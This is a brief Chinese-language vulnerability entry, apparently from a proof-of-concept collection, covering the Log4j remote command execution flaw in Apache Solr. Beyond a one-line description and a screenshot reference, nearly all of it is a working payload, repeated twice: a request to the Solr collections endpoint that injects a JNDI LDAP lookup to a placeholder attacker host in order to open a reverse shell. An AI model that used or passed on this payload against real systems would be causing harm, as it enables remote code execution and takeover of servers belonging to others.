# Apache Solr Log4j 组件 远程命令执行漏洞

## 漏洞描述
Apache Solr Log4j 组件 远程命令执行漏洞，详情略

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![](images/202205251622273.png)

验证 POC

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```


## Payloads
```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```
